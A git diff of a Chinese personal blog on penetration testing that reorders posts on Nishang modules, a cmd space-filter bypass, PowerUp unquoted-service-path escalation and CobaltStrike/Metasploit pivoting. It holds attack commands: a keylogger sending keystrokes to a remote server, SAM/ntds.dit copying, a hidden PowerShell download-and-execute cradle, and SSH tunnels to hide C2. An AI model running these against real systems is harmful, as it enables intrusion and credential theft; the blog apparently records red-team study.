@@ -1695,7 +1695,7 @@ Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">cmd绕过空格过滤</a></h1>
         
 
         <div class="post-meta">
@@ -1730,8 +1730,8 @@ Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
+                  <a href="/categories/杂项/" itemprop="url" rel="index">
+                    <span itemprop="name">杂项</span>
                   </a>
                 </span>
 
@@ -1769,52 +1769,18 @@ Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
       
         
           
-            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+            <h1 id="cmd绕过空格过滤"><a href="#cmd绕过空格过滤" class="headerlink" title="cmd绕过空格过滤"></a>cmd绕过空格过滤</h1><p>Ps：<strong>从大佬那里学的一点小技巧</strong></p>
+<p>Windows支持环境变量切片操作，可以切割出一个空格接上。</p>
 <blockquote>
-<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+<p>set //查看环境变量</p>
 </blockquote>
-<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-<ul>
-<li>Antak-Webshell //webshell</li>
-<li>Backdoor //后门</li>
-<li>Client //客户端</li>
-<li>Escalation //提权</li>
-<li>Execution //RCE</li>
-<li>Gather //信息收集</li>
-<li>Misc //杂项</li>
-<li>Pivot //跳板及远程执行exe</li>
-<li>Scan //扫描</li>
-<li>powerpreter //文件下载及持续性</li>
-</ul>
-<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
-<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
 <blockquote>
-<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+<p>net%CommonProgramFiles:~10,-18%user </p>
+<p> 意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user<br>既</p>
 </blockquote>
-<p>** Copy-VSS.ps1 **</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-<blockquote>
-<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
-</blockquote>
-<pre><code>Copy-VSS //直接把文件保存到当前路径
-Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
-<blockquote>
-<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
-</blockquote>
-<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
-FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
-<blockquote>
-<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
-</blockquote>
-<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
-.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
-erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
-.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
-Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
-<blockquote>
-<p>获取用户密码的提示信息，如果有的话。</p>
-</blockquote>
-<pre><code>Get-PassHints</code></pre>
+<pre><code>CommonProgramFiles=C:\Program Files\Common Files
+net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br>** 经测试在win7,win10,win8,win2008,win2003,均有效</p>
+
           
         
       
@@ -1881,7 +1847,7 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">CobaltStrike+MetaSploit联动攻击</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Window下使用PowerUp辅助提权</a></h1>
         
 
         <div class="post-meta">
@@ -1916,8 +1882,8 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透</span>
+                  <a href="/categories/提权/" itemprop="url" rel="index">
+                    <span itemprop="name">提权</span>
                   </a>
                 </span>
 
@@ -1955,41 +1921,16 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
       
         
           
-            <h1 id="CobaltStrike-MetaSploit联动攻击"><a href="#CobaltStrike-MetaSploit联动攻击" class="headerlink" title="CobaltStrike+MetaSploit联动攻击"></a>CobaltStrike+MetaSploit联动攻击</h1><p>** 本文源于klion红队攻防揭秘  观后复现 **</p>
-<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><blockquote>
-<p>1，通过beacon内置socks，将msf带入目标内网<br>2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf<br>3，使用msf的exp直接弹回一个beacon<br>4，灵活使用ssh隧道深度隐藏C2</p>
-</blockquote>
-<h2 id="通过beacon内置socks，将msf带入目标内网"><a href="#通过beacon内置socks，将msf带入目标内网" class="headerlink" title="通过beacon内置socks，将msf带入目标内网"></a>通过beacon内置socks，将msf带入目标内网</h2><p>** CS **</p>
-<ul>
-<li>beacon&gt; getuid</li>
-<li>beacon&gt; socks 1080<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/5.png" alt="avatar"></li>
-<li><ul>
-<li>msf **</li>
-</ul>
-</li>
-<li>msf5 &gt; setg Proxies socks4:XXX.XXX.XXX.XXX:1080  //设置代理</li>
-<li>msf5 &gt; setg ReversseAllowProxy true  //双向通道</li>
-</ul>
-<p>现在就可以直接用msf的auxiliary模块扫描目标内网了<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/3.png" alt="avatar"></p>
-<h2 id="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf"><a href="#使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf" class="headerlink" title="使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **"></a>使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf **</h2><p><strong>* 首先创建CS外部tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/4.png" alt="avatar"><br><strong>* 然后到本地机器msf创建tcp监听器 *</strong><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/8.png" alt="avatar"><br><strong>* 随后，在vps机器上编辑sshd配置，开启ssh转发功能，重启ssh服务，这是所有使用ssh隧道转发前的必备操作。 *</strong></p>
-<pre><code># vi/etc/ssh/sshd_config
-AllowTcpForwarding yes
-GatewayPorts yes
-TCPKeepAlive yes
-PasswordAuthentication yes
-# systemctl restartsshd.service</code></pre><p><strong>* 回到本地linux中并通过ssh隧道做好ssh转发，意思就是通过vps把来自外部的8080端口流量全部转到本地linux的8080端口上，而本地linux的8080端口上跑的又正好是msf的监听器，所以，最终才会造成meterpreter本地上线的效果 *</strong></p>
-<pre><code># ssh -C -f -N -g -R 0.0.0.0:8080:192.168.0.108:8080 root@xxx.xxx.xxx.xxx -p 22 //建立ssh隧道
-&gt;  -C     //压缩数据 
-&gt;  -f     //运行在后台
-&gt;  -N     //不远程执行命令，对端口转发很有用
-&gt;  -g     //允许远程主机连接到本地转发端口
-&gt;  -R     //[bind_address:]port:host:hostport  端口及地址配置
-# netstat -tulnp | grep &apos;8080&apos; //检查通道是否成功建立</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/7.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/6.png" alt="avatar"></p>
-<p>   <strong>* 最后，回到cs上选择目标内网指定机器的beacon shell 点击 “Spawn” 派生，再选择刚在上面创建好的tcp的外部监听器，相应目标机器的meterpreter就会被直接弹到本地，也可以选择批量操作 *</strong></p>
-<h2 id="使用msf的exp直接弹回一个beacon"><a href="#使用msf的exp直接弹回一个beacon" class="headerlink" title="使用msf的exp直接弹回一个beacon"></a>使用msf的exp直接弹回一个beacon</h2><p>** 暂时复现失败 ** </p>
-<h2 id="灵活利用ssh隧道深度隐藏C2"><a href="#灵活利用ssh隧道深度隐藏C2" class="headerlink" title="灵活利用ssh隧道深度隐藏C2"></a>灵活利用ssh隧道深度隐藏C2</h2><blockquote>
-<p>首先，创建一个普通的http 反向beacon监听器，并用该监听器生成一个64位的exe payload，随后再立即删除该监听器<br>然后本地开启ssh隧道转发，转发刚刚删除的监听器的端口。<br>本地启动cs服务，监听转发的端口，监听器与删除监听器配置相同。<br>当payload执行，本地服务上线。<br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/29/CobaltStrike+MetaSploit%E8%81%94%E5%8A%A8%E6%8A%80%E5%B7%A7/cs&msf.png" alt="avatar"></p>
-</blockquote>
+            <h1 id="Window下使用PowerUp辅助提权"><a href="#Window下使用PowerUp辅助提权" class="headerlink" title="Window下使用PowerUp辅助提权"></a>Window下使用PowerUp辅助提权</h1><p><strong>*  前言 *</strong>：每当获得shell的时候，提权总是一件很重要的事情，虽然在很多时候提权没那么必要，但是能灵活的提权才是在系统中常驻的基石。在现如今主流渗透框架的自动提权模块被各大AV厂商和补丁围杀渡劫下，在严格一点的环境，基本上没有任何用处，加上内核提权可能出现的崩溃蓝屏，反而容易打草惊蛇，得不偿失。PowerUp是在我尝试过各种提权手段后，个人觉得最为灵活，好用的提权辅助。</p>
+<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>PowerUp是PowerSploit中的提权辅助脚本，整合所有因为配置错误而导致的Windows本地权限提权向量。，例如：** 不带引号的服务路径，不安全的服务权限，不安全的文件系统权限，AlwaysInstallElevated，注册表……. **这些都是属于杀软与补丁难以管辖的无主之地，而我们所需要做的只是发现并稍加利用， 一切就尽在掌控之中了。              </p>
+<pre><code>https://github.com/PowerShellMafia/PowerSploit     //PowerSploit的GitHub地址</code></pre><p>在本机杀软和补丁齐全的情况下，依旧检测出了多处可用于提权的配置缺陷。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/1.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/3.png" alt="avatar"><br>这里我选择了最方便的服务路径提权，首先上传ASUS.exe到C:\Program Files\ASUSTek COMPUTER INC\目录下。</p>
+<p>原因：Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在这个示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
+<pre><code>C:\Program.exe
+C:\Program Files\ASUSTek.exe
+C:\Program Files\ASUSTek COMPUTER.exe
+C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找就会找到并运行上传的的ASUS.exe,然后就不会继续向下寻找了，此时ASUS.exe就是系统会启动的服务程序。</p>
+<p>通过重启服务返回了SYSTEM的session</p>
+<pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
 
           
         
@@ -2278,158 +2219,6 @@ Keyboard.end();//结束键盘通讯
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">cmd绕过空格过滤</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/杂项/" itemprop="url" rel="index">
-                    <span itemprop="name">杂项</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="cmd绕过空格过滤"><a href="#cmd绕过空格过滤" class="headerlink" title="cmd绕过空格过滤"></a>cmd绕过空格过滤</h1><p>Ps：<strong>从大佬那里学的一点小技巧</strong></p>
-<p>Windows支持环境变量切片操作，可以切割出一个空格接上。</p>
-<blockquote>
-<p>set //查看环境变量</p>
-</blockquote>
-<blockquote>
-<p>net%CommonProgramFiles:~10,-18%user </p>
-<p> 意思是把CommonProgramFiles变量的正数10位和倒数18位全部切除，然后就剩下一个空格。形变为net user<br>既</p>
-</blockquote>
-<pre><code>CommonProgramFiles=C:\Program Files\Common Files
-net%CommonProgramFiles:~10,-18%user=net user</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/06/cmd%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4/1.png" alt="avatar"><br>** 经测试在win7,win10,win8,win2008,win2003,均有效</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
                 <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">PowerSploit基本功能演示</a></h1>
         
 
@@ -2632,7 +2421,7 @@ Get-Keystrokes -LogPath c:\test.txt
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Window下使用PowerUp辅助提权</a></h1>
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
         
 
         <div class="post-meta">
@@ -2667,8 +2456,8 @@ Get-Keystrokes -LogPath c:\test.txt
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/提权/" itemprop="url" rel="index">
-                    <span itemprop="name">提权</span>
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
                   </a>
                 </span>
 
@@ -2706,17 +2495,52 @@ Get-Keystrokes -LogPath c:\test.txt
       
         
           
-            <h1 id="Window下使用PowerUp辅助提权"><a href="#Window下使用PowerUp辅助提权" class="headerlink" title="Window下使用PowerUp辅助提权"></a>Window下使用PowerUp辅助提权</h1><p><strong>*  前言 *</strong>：每当获得shell的时候，提权总是一件很重要的事情，虽然在很多时候提权没那么必要，但是能灵活的提权才是在系统中常驻的基石。在现如今主流渗透框架的自动提权模块被各大AV厂商和补丁围杀渡劫下，在严格一点的环境，基本上没有任何用处，加上内核提权可能出现的崩溃蓝屏，反而容易打草惊蛇，得不偿失。PowerUp是在我尝试过各种提权手段后，个人觉得最为灵活，好用的提权辅助。</p>
-<h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>PowerUp是PowerSploit中的提权辅助脚本，整合所有因为配置错误而导致的Windows本地权限提权向量。，例如：** 不带引号的服务路径，不安全的服务权限，不安全的文件系统权限，AlwaysInstallElevated，注册表……. **这些都是属于杀软与补丁难以管辖的无主之地，而我们所需要做的只是发现并稍加利用， 一切就尽在掌控之中了。              </p>
-<pre><code>https://github.com/PowerShellMafia/PowerSploit     //PowerSploit的GitHub地址</code></pre><p>在本机杀软和补丁齐全的情况下，依旧检测出了多处可用于提权的配置缺陷。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/1.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/3.png" alt="avatar"><br>这里我选择了最方便的服务路径提权，首先上传ASUS.exe到C:\Program Files\ASUSTek COMPUTER INC\目录下。</p>
-<p>原因：Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在这个示例中，如果系统运行该服务，它将尝试运行以下可执行文件：</p>
-<pre><code>C:\Program.exe
-C:\Program Files\ASUSTek.exe
-C:\Program Files\ASUSTek COMPUTER.exe
-C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找就会找到并运行上传的的ASUS.exe,然后就不会继续向下寻找了，此时ASUS.exe就是系统会启动的服务程序。</p>
-<p>通过重启服务返回了SYSTEM的session</p>
-<pre><code>sc restart ASUSGamingControlService     //重启服务</code></pre><p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/30/Window%E4%B8%8B%E4%BD%BF%E7%94%A8PowerUp%E8%BE%85%E5%8A%A9%E6%8F%90%E6%9D%83/4.png" alt="avatar"></p>
-
+            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+</blockquote>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
+</ul>
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
           
         
       
@@ -2873,6 +2697,182 @@ C:\Program Files\ASUSTek COMPUTER INC\ASUS.exe</code></pre><p>这样层层寻找
 <pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
 </li>
 </ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">CobaltStrike+MetaSploit联动攻击</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="CobaltStrike-MetaSploit联动攻击"><a href="#CobaltStrike-MetaSploit联动攻击" class="headerlink" title="CobaltStrike+MetaSploit联动攻击"></a>CobaltStrike+MetaSploit联动攻击</h1><p>** 本文源于klion红队攻防揭秘  观后复现 **</p>
+<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><blockquote>
+<p>1，通过beacon内置socks，将msf带入目标内网<br>2，使用CS的外部tcp监听器，通过ssh隧道派生一个session到msf<br>3，使用msf的exp直接弹回一个beacon<br>4，灵活使用ssh隧道深度隐藏C2</p>
+</blockquote>
